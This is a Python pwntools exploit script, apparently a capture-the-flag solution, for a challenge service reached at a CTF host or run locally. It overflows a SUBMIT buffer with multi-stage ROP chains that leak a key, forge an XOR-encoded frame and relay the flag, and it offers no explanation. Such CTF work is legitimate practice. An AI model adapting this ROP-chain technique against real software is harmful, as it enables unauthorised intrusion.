from pwn import *
context.log_level='info'
context.arch='amd64'

WRITE   = 0x401190
READ    = 0x4011f0
POP_RDI = 0x401529
POP_RSI = 0x401dd5
MULTIPOP= 0x401520   # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
LOOP    = 0x4014d0
RELAY   = 0x401f70
KEY     = 0x405060
BSS_FRAME = 0x40a200
BSS_OP    = 0x40a220
CMD_BUF   = 0x40a300
CMD_END   = 0x40a300+0x300

def op(fn, fd, addr):
    return p64(POP_RDI)+p64(fd)+p64(POP_RSI)+p64(addr)+p64(fn)

def stage_read(addr):
    return op(READ, 0, addr)

def stage_write(fd, addr):
    return op(WRITE, fd, addr)

def subm_payload(chain):
    p = b'A'*0x48 + chain
    assert len(p) <= 255
    p += b'B'*(255-len(p))
    return p

# Stage1: leak key + set loop registers
chain1  = stage_write(1, KEY)
chain1 += stage_write(1, KEY+1)
chain1 += p64(MULTIPOP)+p64(CMD_END)+p64(CMD_BUF)+p64(0x4030ba)+p64(0x4030bf)+p64(0x4030ca)+p64(CMD_BUF)
chain1 += p64(LOOP)
payload1 = subm_payload(chain1)

# Stage2: read 9-byte frame + 3-byte op string
chain2  = stage_read(BSS_FRAME)
chain2 += stage_read(BSS_FRAME+3)
chain2 += stage_read(BSS_FRAME+6)
chain2 += stage_read(BSS_OP)
chain2 += p64(LOOP)
payload2 = subm_payload(chain2)

# Stage3: write 9 bytes frame to fd3
chain3  = stage_write(3, BSS_FRAME)
chain3 += stage_write(3, BSS_FRAME+3)
chain3 += stage_write(3, BSS_FRAME+6)
chain3 += p64(LOOP)
payload3 = subm_payload(chain3)

def run(io):
    io.recvuntil(b'sh> ')
    # Stage 1
    io.sendline(b'SUBMIT 255')
    io.recvuntil(b'GO\n')
    io.send(payload1)
    io.recvuntil(b'OK\n')
    leak6 = io.recvn(6)
    log.info('leak6=%s'%leak6.hex())
    k0,k1,k2,k3 = leak6[0],leak6[1],leak6[2],leak6[5]
    key = bytes([k0,k1,k2,k3])
    log.info('key bytes = %s'%key.hex())
    io.recvuntil(b'sh> ')
    # build frame: type3 len5 payload fffffffc 00
    plain = bytes([0x03,0x00,0x05,0x00, 0xfc,0xff,0xff,0xff, 0x00])
    ks = key[::-1]
    frame = bytes([plain[i]^ks[i%4] for i in range(len(plain))])
    log.info('frame=%s'%frame.hex())
    # Stage 2
    io.sendline(b'SUBMIT 255')
    io.recvuntil(b'GO\n')
    io.send(payload2 + frame + b'1\x00\x00')
    io.recvuntil(b'OK\n')
    io.recvuntil(b'sh> ')
    # Stage 3
    io.sendline(b'SUBMIT 255')
    io.recvuntil(b'GO\n')
    io.send(payload3)
    io.recvuntil(b'OK\n')
    io.recvuntil(b'sh> ')
    # Stage 4: RELAY 1 -> parent reads queued flag response
    io.sendline(b'RELAY 1')
    try:
        out = io.recv(timeout=5)
    except Exception:
        out = b''
    more=b''
    try:
        more = io.recv(timeout=3)
    except Exception:
        pass
    return out+more

if __name__=='__main__':
    import sys
    if len(sys.argv)>1 and sys.argv[1]=='remote':
        io=remote('chal.sunshinectf.games',26007)
    else:
        io=process('./service')
    out=run(io)
    print("OUTPUT:", out)
